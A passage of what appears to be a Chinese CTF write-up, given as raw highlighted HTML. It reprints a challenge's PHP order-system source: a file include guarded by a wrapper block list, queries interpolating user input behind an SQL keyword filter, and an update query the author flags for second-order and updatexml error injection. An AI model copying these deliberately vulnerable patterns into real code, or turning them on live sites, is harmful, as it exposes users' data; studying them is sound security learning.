<span class="token punctuation">:</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/phar|zip|bzip2|zlib|data|input|%00/i"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'no way!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>除了<code>index.php</code>之外，还有下面的文件同样可以使用相同的方法来读取<code>confirm.php</code>，<code>delete.php</code>，<code>change.php</code>，<code>search.php</code><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token comment">//confirm.php</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">;</span><span class="token comment">//var_dump($_POST);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from `user` where `user_name`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user_name</span><span class="token punctuation">&#125;</span></span>' and `phone`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$phone</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$user_name</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"已提交订单"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span><span class="token punctuation">;</span>        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$re</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"sss"</span><span class="token punctuation">,</span> <span class="token variable">$user_name</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">,</span> <span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$re</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"订单提交成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">//delete.php</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from `user` where `user_name`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user_name</span><span class="token punctuation">&#125;</span></span>' and `phone`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$phone</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'delete from `user` where `user_id`='</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"订单删除成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"未找到订单!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token comment">//change.php</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from `user` where `user_name`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user_name</span><span class="token punctuation">&#125;</span></span>' and `phone`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$phone</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"订单修改成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"未找到订单!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">//search.php</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from `user` where `user_name`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user_name</span><span class="token punctuation">&#125;</span></span>' and `phone`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$phone</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;p>姓名:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/p>&lt;p>, 电话:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/p>&lt;p>, 地址:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"未找到订单!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token comment">//config.php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$DATABASE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token double-quoted-string string">"host"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">,</span>    <span class="token double-quoted-string string">"username"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span>    <span class="token double-quoted-string string">"password"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span>    <span class="token double-quoted-string string">"dbname"</span> <span class="token operator">=</span><span class="token operator">></span><span class="token double-quoted-string string">"ctfusers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$DATABASE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$DATABASE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$DATABASE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$DATABASE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'dbname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-二次注入-amp-amp-updatexml报错注入"><a href="#2-二次注入-amp-amp-updatexml报错注入" class="headerlink" title="2.二次注入&amp;&amp;updatexml报错注入"></a>2.二次注入&amp;&amp;updatexml报错注入</h2><p>这里的<code>change.php</code>改订单的功能有二次注入的点，看代码<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token comment">//change.php</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string 